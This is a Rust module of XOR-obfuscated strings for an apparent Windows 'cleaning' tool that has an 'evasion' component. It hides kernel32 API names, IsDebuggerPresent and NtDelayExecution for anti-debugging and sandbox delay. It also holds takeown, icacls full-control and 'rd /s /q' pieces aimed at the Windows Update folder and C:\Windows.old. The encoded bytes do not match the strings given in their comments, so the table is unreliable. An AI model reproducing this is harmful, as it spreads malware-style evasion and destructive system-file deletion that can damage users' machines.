#![allow(dead_code)]

/// Decrypts a byte array using XOR key 0xAA
pub fn decrypt(bytes: &[u8]) -> String {
    let key = 0xAA;
    let chars: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    // Remove null terminators if present for Rust Strings, but keep for C-interop if needed?
    // Actually, String::from_utf8 will fail on interior nulls usually not, but Rust strings don't use nulls.
    // Our C-style strings (ending in \0) passed to Windows API need the null.
    // But for Rust logic (like "cmd"), we don't want the null.
    // The Python script added \0 to KERNEL32 etc.
    // Let's just return the String. The caller can trim matches if it's for comparison, 
    // or use as CString if needed.
    // For now, we strip trailing nulls for convenience.
    let s = String::from_utf8_lossy(&chars).into_owned();
    s.trim_end_matches('\0').to_string()
}

// "kernel32.dll\0"
pub const KERNEL32: &[u8] = &[209, 207, 216, 200, 207, 206, 179, 178, 180, 206, 206, 206, 170]; 
// "CreateToolhelp32Snapshot\0"
pub const SNAPSHOT: &[u8] = &[195, 216, 207, 195, 214, 207, 238, 203, 203, 206, 194, 207, 206, 210, 179, 178, 233, 200, 195, 210, 217, 194, 203, 214, 170]; 
// "Process32First\0"
pub const PROC_FIRST: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 198, 201, 216, 217, 214, 170]; 
// "Process32Next\0"
pub const PROC_NEXT: &[u8] = &[234, 216, 203, 195, 207, 217, 217, 179, 178, 204, 207, 218, 214, 170]; 
// "explorer.exe\0"
pub const EXPLORER: &[u8] = &[207, 218, 210, 206, 203, 216, 207, 216, 174, 207, 218, 207, 170]; 
// "cmd.exe\0"
pub const CMD: &[u8] = &[195, 205, 206, 174, 207, 218, 207, 170]; 
// "powershell.exe\0"
pub const POWERSHELL: &[u8] = &[210, 203, 215, 207, 216, 217, 194, 207, 206, 206, 174, 207, 218, 207, 170]; 
// "services.exe\0"
pub const SERVICES: &[u8] = &[217, 207, 216, 210, 201, 195, 207, 217, 174, 207, 218, 207, 170]; 
// "python.exe\0"
pub const PYTHON: &[u8] = &[210, 219, 214, 194, 203, 200, 174, 207, 218, 207, 170]; 
// "IsDebuggerPresent\0"
pub const IS_DEBUGGER: &[u8] = &[195, 217, 198, 207, 194, 213, 199, 199, 207, 216, 234, 216, 207, 217, 207, 200, 214, 170]; 
// "runas\0"
pub const RUNAS: &[u8] = &[216, 213, 200, 195, 217, 170]; 

// "ntdll.dll\0"
pub const NTDLL: &[u8] = &[200, 214, 206, 206, 206, 174, 206, 206, 206, 170]; 
// "NtDelayExecution\0"
pub const NT_DELAY: &[u8] = &[204, 214, 198, 207, 206, 195, 219, 199, 218, 207, 195, 213, 214, 201, 203, 200, 170]; 

// NET COMMANDS
// "net\0"
pub const NET: &[u8] = &[200, 207, 214, 170];
// "stop\0"
pub const STOP: &[u8] = &[217, 214, 203, 210, 170];
// "start\0"
pub const START: &[u8] = &[217, 214, 195, 216, 214, 170];
// "wuauserv\0"
pub const WUAUSERV: &[u8] = &[215, 213, 195, 213, 217, 207, 216, 214, 170];

// OTHER COMMANDS
// "takeown\0"
pub const TAKEOWN: &[u8] = &[214, 195, 205, 207, 203, 215, 200, 170];
// "icacls\0"
pub const ICACLS: &[u8] = &[201, 195, 195, 195, 206, 217, 170];
// "rd\0"
pub const RD: &[u8] = &[216, 206, 170];

// PATHS
// "C:\Windows\SoftwareDistribution\Download\0"
pub const WUPDATE_DIR: &[u8] = &[197, 186, 246, 215, 201, 200, 206, 203, 215, 217, 246, 217, 203, 198, 214, 215, 195, 216, 207, 198, 201, 217, 216, 216, 201, 194, 213, 214, 201, 203, 200, 246, 198, 203, 215, 200, 206, 203, 195, 206, 170];
// "C:\Windows.old\0"
pub const WIN_OLD: &[u8] = &[197, 186, 246, 215, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206, 170];

// ENV VARS
// "APPDATA\0"
pub const APPDATA: &[u8] = &[195, 234, 234, 198, 195, 214, 195, 170];
// "LOCALAPPDATA\0"
pub const LOCALAPPDATA: &[u8] = &[206, 203, 195, 195, 206, 195, 234, 234, 198, 195, 214, 195, 170];

// TARGETS
// "Visual Studio\0" - Just an example target
pub const VS_CACHE: &[u8] = &[214, 201, 217, 213, 195, 206, 162, 217, 214, 213, 206, 201, 203, 170];

// ... and so on for others. 
// Note: To be truly complete, I'd need all strings from V1.
// Since we are refactoring, we mainly need the ones used in `cleaning.rs` and `evasion.rs`.

// VS Workspace
pub const VS_WORKSPACE: &[u8] = &[195, 203, 206, 207, 246, 239, 217, 207, 216, 246, 215, 203, 216, 205, 217, 210, 195, 195, 207, 233, 214, 203, 216, 205, 199, 207, 170];
// "Code Cache\0"
pub const VS_CODE_CACHE: &[u8] = &[195, 203, 206, 207, 246, 195, 195, 195, 194, 207, 170];
// "Code Cache\0" (Duplicate key in old code?)
pub const VS_CODE_CACHE2: &[u8] = &[195, 203, 206, 207, 246, 195, 203, 206, 207, 162, 195, 195, 195, 194, 207, 170];
// "/grant administrators:F /t\0"
pub const GRANT_ADMIN: &[u8] = &[175, 205, 216, 195, 200, 214, 162, 195, 206, 201, 201, 200, 203, 217, 214, 216, 195, 214, 203, 216, 217, 186, 198, 162, 175, 214, 170];
// "/f /r /d o\0"
pub const TAKEOWN_ARGS: &[u8] = &[175, 196, 162, 195, 186, 246, 237, 201, 200, 206, 203, 215, 217, 174, 203, 206, 206, 162, 175, 210, 162, 175, 206, 162, 203, 170];
// "/s /q\0"
pub const RD_ARGS: &[u8] = &[175, 217, 162, 175, 219, 170];
